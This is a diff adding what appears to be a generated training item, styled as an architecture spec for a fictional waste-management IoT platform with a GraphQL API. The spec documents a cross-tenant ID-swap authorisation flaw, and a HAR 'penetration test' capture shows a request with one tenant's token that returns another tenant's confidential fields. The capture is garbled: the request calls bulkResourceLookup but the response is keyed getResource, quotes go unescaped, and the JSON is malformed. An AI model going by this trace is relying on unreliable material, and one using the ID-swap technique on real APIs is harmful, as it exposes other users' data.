@@ -1,0 +1,131 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** CleanRoute IoT Platform
+**Document Version:** 5.7.9 (FINAL)
+**Classification:** SENSITIVE
+**Domain:** Waste Management / Smart Bins
+**Architecture:** MQTT + REST + GraphQL routing
+**Training Example ID:** GQL-0042
+
+## 1.0 Executive Summary
+CleanRoute IoT Platform is a waste management / smart bins platform that exposes a GraphQL API to authorised consumers.
+The platform manages data records partitioned by tenant (`tenantId`). The architecture uses
+JWT-based OAuth2 authentication, and the JWT carries both the `sub` (user ID) and `tenantId` claims.
+Authorization is expected to be enforced per-resolver on the GraphQL server.
+
+## 2.0 Architecture Overview
+- **API Layer:** GraphQL single endpoint (`POST /graphql`) served via Apollo Server
+- **Auth:** OAuth2 JWT issued by internal IdP; claims include `sub`, `role`, `tenantId`
+- **Database:** PostgreSQL with row-level security policies; each table has a `tenant_id` column
+- **Caching:** Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)
+
+## 3.0 GraphQL Schema
+```graphql
+
+type Resource {
+  resourceId: ID!
+  tenantId: ID!
+  ownerId: ID!
+  status: String!
+  data: ResourceData
+  items: [Item!]
+}
+
+type ResourceData {
+  title: String
+  sensitiveField: String      # PII / business-sensitive
+  internalNotes: String       # Internal-only field
+  auditLog: [AuditEntry!]
+}
+
+type Query {
+  getResource(id: ID!): Resource
+  listResources(tenantId: ID, status: String): [Resource!]
+  getResourceWithChildren(id: ID!): Resource
+}
+
+type Mutation {
+  updateResource(id: ID!, input: ResourceInput!): Resource
+  deleteResource(id: ID!): Boolean
+  bulkResourceLookup(ids: [ID!]!): [Resource!]
+}
+
+```
+
+## 4.0 Known Architectural Notes
+- **RISK-GQL-042:** The `getResource` resolver fetches by `resourceId` only.
+  The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`.
+  Tracked internally as a known gap pending remediation.
+- The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without
+  per-ID ownership filtering.
+
+## 5.0 Vulnerability Context
+**Pattern:** 10.1 — ID swap in own request (Single-User)
+
+The `resourceId` field is used as the object identifier across all resolvers.
+A single authenticated user substitutes their own valid `resourceId` with a victim's `resourceId`. With one token, data belonging to another user is accessible.
+
+## 6.0 HAR Capture (Network Trace)
+The following HTTP Archive (HAR) capture was recorded during a penetration test.
+The attacker's token belongs to `tenant-db28` but the requested object belongs to `tenant-2d3c`.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {"name": "SecurityProxy", "version": "1.0"},
+    "entries": [
+      {
+        "startedDateTime": "2026-04-13T16:22:34.462348+00:00",
+        "time": 167,
+        "request": {
+          "method": "POST",
+          "url": "https://api.cleanroute-iot-platf.example.com/graphql",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            {"name": ":authority", "value": "api.cleanroute-iot-platf.example.com"},
+            {"name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"},
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-tenant-id", "value": "tenant-db28"}
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+            "text": "{\"query\": \"query VulnerableOp { bulkResourceLookup(ids: ["R-2042", "R-1042", "R-3042"]) { resourceId tenantId data { sensitiveField } } }\"}"
+          },
+          "bodySize": 92
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "headers": [
+            {"name": "content-type", "value": "application/json"},
+            {"name": "x-request-id", "value": "req-db282d3c"}
+          ],
+          "content": {
+            "size": 409,
+            "mimeType": "application/json",
+            "text": "{\"data\": {\"getResource\": {\"tenantId\": \"tenant-2d3c\", \"ownerId\": \"other-user-db282d3c\", \"data\": {\"sensitiveField\": \"CONFIDENTIAL-db282d3c\", \"internalNotes\": \"Internal data exposed\"}}}}"}"
+          },
+          "bodySize": 597,
+          "redirectURL": "",
+          "headersSize": 120
+        },
+        "timings": {"send": 2, "wait": 259, "receive": 5},
+        "cache": {}
+      }
+    ]
+  }
+}
+```
+
+## 7.0 API Contract (Partial)
+```
+POST /graphql
+Authorization: Bearer <JWT>
+Content-Type: application/json
+
+Body: { "query": "..." }
+
+Authenticated user's tenantId is extracted from JWT.
+Resolver MUST cross-check tenantId against fetched object's tenantId.
+```
